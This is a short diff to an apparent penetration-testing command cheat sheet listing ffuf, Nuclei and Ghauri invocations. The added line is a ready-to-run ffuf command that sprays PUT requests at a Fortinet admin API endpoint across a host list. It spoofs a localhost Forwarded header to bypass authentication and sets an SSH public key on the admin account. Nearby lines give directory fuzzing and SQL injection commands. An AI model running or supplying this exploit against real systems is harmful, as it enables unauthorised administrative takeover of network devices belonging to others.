@@ -6,6 +6,7 @@ Nuclei Command
 FFUF Command
 ~ > ffuf -u https://codingo.io/FUZZ -w ./wordlist -recursion -e .bak
 ~ > ffuf -u https://rendering-prd.redacted.com/FUZZ -w english-words.txt -mc all -fw 6
+~ > ffuf -w "host_list.txt:URL" -u "https://URL/api/v2/cmdb/system/admin/admin" -x PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000;' -d '{"ssh-public-key1" "h4x0r"}' -mr "SSH" -r -x http://127.0.0.1:8080
 
 Ghauri Command
 ~ > ghauri -r sqli-req.txt --dbms=MySQL --technique=T --current-db
